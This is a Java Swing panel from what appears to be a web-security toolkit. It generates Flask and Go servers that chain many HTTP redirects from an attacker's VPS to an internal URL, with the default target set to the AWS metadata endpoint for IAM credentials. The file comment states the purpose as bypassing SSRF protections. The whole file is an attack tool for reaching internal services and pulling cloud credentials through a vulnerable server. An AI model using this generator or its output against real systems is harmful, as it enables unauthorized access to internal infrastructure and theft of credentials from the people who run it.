package top10.ui;

import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.StringSelection;

/**
 * SSRF redirect chain generator tool panel.
 * <p>
 * Generates Flask (Python) and Go HTTP server code that creates a chain of N
 * redirects with incrementing status codes. The final redirect points at the
 * user-supplied internal target URL. Useful for bypassing SSRF protections that
 * only check the first redirect or only block certain status codes.
 */
public class SsrfHelperPanel extends JPanel {

    private static final int DEFAULT_STATUS_CODE = 302;
    private static final int DEFAULT_NUM_REDIRECTS = 10;
    private static final int MIN_STATUS_CODE = 300;
    private static final int MAX_STATUS_CODE = 310;
    private static final int MIN_REDIRECTS = 1;
    private static final int MAX_REDIRECTS = 50;
    private static final int DEFAULT_PORT = 8888;

    // -- Form fields --
    private final JTextField vpsIp;
    private final JTextField targetUrl;
    private final JSpinner startCode;
    private final JSpinner numRedirects;

    // -- Buttons --
    private final JButton generateFlaskBtn;
    private final JButton generateGoBtn;
    private final JButton copyBtn;

    // -- Output --
    private final JTextArea codeOutput;

    public SsrfHelperPanel() {
        setLayout(new BorderLayout(0, 6));
        setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        // =====================================================================
        // Top form section (GridBagLayout)
        // =====================================================================
        JPanel formPanel = new JPanel(new GridBagLayout());
        formPanel.setBorder(BorderFactory.createTitledBorder("Redirect Chain Configuration"));
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(4, 6, 4, 6);
        gbc.anchor = GridBagConstraints.WEST;

        int row = 0;

        // VPS IP
        gbc.gridx = 0; gbc.gridy = row; gbc.fill = GridBagConstraints.NONE; gbc.weightx = 0;
        formPanel.add(new JLabel("VPS IP:"), gbc);
        vpsIp = new JTextField("YOUR_VPS_IP", 20);
        gbc.gridx = 1; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 0.5;
        formPanel.add(vpsIp, gbc);

        // Starting Status Code
        gbc.gridx = 2; gbc.fill = GridBagConstraints.NONE; gbc.weightx = 0;
        formPanel.add(new JLabel("Starting Status Code:"), gbc);
        startCode = new JSpinner(new SpinnerNumberModel(DEFAULT_STATUS_CODE, MIN_STATUS_CODE, MAX_STATUS_CODE, 1));
        gbc.gridx = 3; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 0.2;
        formPanel.add(startCode, gbc);

        // Target Internal URL
        row++;
        gbc.gridx = 0; gbc.gridy = row; gbc.fill = GridBagConstraints.NONE; gbc.weightx = 0;
        formPanel.add(new JLabel("Target Internal URL:"), gbc);
        targetUrl = new JTextField("http://169.254.169.254/latest/meta-data/iam/security-credentials/", 50);
        gbc.gridx = 1; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 1.0; gbc.gridwidth = 3;
        formPanel.add(targetUrl, gbc);
        gbc.gridwidth = 1;

        // Number of Redirects
        row++;
        gbc.gridx = 0; gbc.gridy = row; gbc.fill = GridBagConstraints.NONE; gbc.weightx = 0;
        formPanel.add(new JLabel("Number of Redirects:"), gbc);
        numRedirects = new JSpinner(new SpinnerNumberModel(DEFAULT_NUM_REDIRECTS, MIN_REDIRECTS, MAX_REDIRECTS, 1));
        gbc.gridx = 1; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 0.2;
        formPanel.add(numRedirects, gbc);

        // Buttons
        row++;
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 0));
        generateFlaskBtn = new JButton("Generate Flask");
        generateGoBtn = new JButton("Generate Go");
        copyBtn = new JButton("Copy to Clipboard");
        buttonPanel.add(generateFlaskBtn);
        buttonPanel.add(generateGoBtn);
        buttonPanel.add(copyBtn);

        gbc.gridx = 0; gbc.gridy = row; gbc.gridwidth = 4; gbc.fill = GridBagConstraints.NONE;
        gbc.weightx = 0; gbc.anchor = GridBagConstraints.WEST;
        formPanel.add(buttonPanel, gbc);

        add(formPanel, BorderLayout.NORTH);

        // =====================================================================
        // Output section
        // =====================================================================
        JPanel outputPanel = new JPanel(new BorderLayout(0, 4));
        outputPanel.setBorder(BorderFactory.createTitledBorder("Generated Code"));

        codeOutput = new JTextArea(22, 80);
        codeOutput.setEditable(false);
        codeOutput.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 13));
        JScrollPane scrollPane = new JScrollPane(codeOutput);
        scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
        outputPanel.add(scrollPane, BorderLayout.CENTER);

        add(outputPanel, BorderLayout.CENTER);

        // =====================================================================
        // Action listeners
        // =====================================================================
        generateFlaskBtn.addActionListener(e -> generateFlask());
        generateGoBtn.addActionListener(e -> generateGo());
        copyBtn.addActionListener(e -> copyToClipboard());
    }

    // =========================================================================
    // Flask code generation
    // =========================================================================

    private void generateFlask() {
        String ip = vpsIp.getText().trim();
        String target = targetUrl.getText().trim();
        int code = (Integer) startCode.getValue();
        int n = (Integer) numRedirects.getValue();

        if (ip.isEmpty() || target.isEmpty()) {
            JOptionPane.showMessageDialog(this, "VPS IP and Target URL are required.",
                    "Validation Error", JOptionPane.WARNING_MESSAGE);
            return;
        }

        StringBuilder sb = new StringBuilder();
        sb.append("from flask import Flask, redirect\n");
        sb.append("\n");
        sb.append("app = Flask(__name__)\n");
        sb.append("\n");

        for (int i = 1; i <= n; i++) {
            int statusCode = computeStatusCode(code, i - 1);
            sb.append("@app.route('/").append(i).append("')\n");
            sb.append("def r").append(i).append("():\n");

            if (i < n) {
                // Intermediate redirect: point to the next route
                sb.append("    return redirect('http://").append(ip).append(":")
                        .append(DEFAULT_PORT).append("/").append(i + 1)
                        .append("', code=").append(statusCode).append(")\n");
            } else {
                // Final redirect: point to the target URL
                sb.append("    return redirect('").append(escapePythonSingleQuoted(target))
                        .append("', code=").append(statusCode).append(")\n");
            }
            sb.append("\n");
        }

        sb.append("if __name__ == '__main__':\n");
        sb.append("    app.run(host='0.0.0.0', port=").append(DEFAULT_PORT).append(")\n");

        codeOutput.setText(sb.toString());
        codeOutput.setCaretPosition(0);
    }

    // =========================================================================
    // Go code generation
    // =========================================================================

    private void generateGo() {
        String ip = vpsIp.getText().trim();
        String target = targetUrl.getText().trim();
        int code = (Integer) startCode.getValue();
        int n = (Integer) numRedirects.getValue();

        if (ip.isEmpty() || target.isEmpty()) {
            JOptionPane.showMessageDialog(this, "VPS IP and Target URL are required.",
                    "Validation Error", JOptionPane.WARNING_MESSAGE);
            return;
        }

        StringBuilder sb = new StringBuilder();
        sb.append("package main\n");
        sb.append("\n");
        sb.append("import (\n");
        sb.append("    \"fmt\"\n");
        sb.append("    \"net/http\"\n");
        sb.append(")\n");
        sb.append("\n");
        sb.append("func main() {\n");

        for (int i = 1; i <= n; i++) {
            int statusCode = computeStatusCode(code, i - 1);
            String redirectTarget;

            if (i < n) {
                redirectTarget = "http://" + ip + ":" + DEFAULT_PORT + "/" + (i + 1);
            } else {
                redirectTarget = target;
            }

            sb.append("    http.HandleFunc(\"/").append(i)
                    .append("\", func(w http.ResponseWriter, r *http.Request) {\n");
            sb.append("        http.Redirect(w, r, \"").append(escapeGoString(redirectTarget))
                    .append("\", ").append(statusCode).append(")\n");
            sb.append("    })\n");
            sb.append("\n");
        }

        sb.append("    fmt.Println(\"Redirect chain server starting on :").append(DEFAULT_PORT).append("\")\n");
        sb.append("    http.ListenAndServe(\":").append(DEFAULT_PORT).append("\", nil)\n");
        sb.append("}\n");

        codeOutput.setText(sb.toString());
        codeOutput.setCaretPosition(0);
    }

    // =========================================================================
    // Copy to clipboard
    // =========================================================================

    private void copyToClipboard() {
        String text = codeOutput.getText();
        if (text == null || text.isEmpty()) {
            JOptionPane.showMessageDialog(this, "Nothing to copy. Generate code first.",
                    "Clipboard", JOptionPane.INFORMATION_MESSAGE);
            return;
        }
        StringSelection selection = new StringSelection(text);
        Toolkit.getDefaultToolkit().getSystemClipboard().setContents(selection, null);
        JOptionPane.showMessageDialog(this, "Code copied to clipboard.",
                "Clipboard", JOptionPane.INFORMATION_MESSAGE);
    }

    // =========================================================================
    // Helpers
    // =========================================================================

    /**
     * Compute the status code for redirect {@code index} (0-based) in the chain.
     * Starting from {@code baseCode}, increments through 300-310, wrapping around
     * if the range is exceeded.
     */
    private static int computeStatusCode(int baseCode, int index) {
        // Range is 300..310 (11 values)
        int offset = (baseCode - MIN_STATUS_CODE + index) % (MAX_STATUS_CODE - MIN_STATUS_CODE + 1);
        return MIN_STATUS_CODE + offset;
    }

    /**
     * Minimal Python string escaping for single-quoted strings.
     */
    private static String escapePythonSingleQuoted(String input) {
        if (input == null) {
            return "";
        }
        return input.replace("\\", "\\\\")
                .replace("'", "\\'");
    }

    /**
     * Minimal Go string escaping for double-quoted strings.
     */
    private static String escapeGoString(String input) {
        if (input == null) {
            return "";
        }
        return input.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }
}
